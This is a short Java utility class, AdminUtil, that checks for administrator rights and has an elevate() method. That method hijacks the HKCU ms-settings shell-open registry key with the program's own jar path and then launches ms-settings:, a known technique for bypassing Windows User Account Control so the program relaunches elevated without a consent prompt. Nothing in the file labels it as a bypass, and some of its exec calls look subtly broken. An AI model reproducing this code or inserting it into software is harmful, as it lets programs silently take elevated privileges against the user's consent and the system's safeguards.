package com.ppp.util;

import java.io.File;

public class AdminUtil {
    public static boolean isAdmin() {
        try {
            Process p = new ProcessBuilder("net", "session").start();
            return p.waitFor() == 0;
        } catch (Exception e) {
            return false;
        }
    }

    public static void elevate() {
        try {
            RegistryBackup.backup();
            File jar = new File(AdminUtil.class.getProtectionDomain().getCodeSource().getLocation().toURI());
            String javaPath = ProcessHandle.current().info().command().orElse("java");
            String runCmd = "\"" + javaPath + "\" -jar \"" + jar.getAbsolutePath() + "\"";
            Runtime.getRuntime().exec("reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /ve /d " + runCmd + " /f");
            Runtime.getRuntime().exec("reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_SZ /d \"\" /f");
            Runtime.getRuntime().exec("start ms-settings:");
            System.exit(0);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}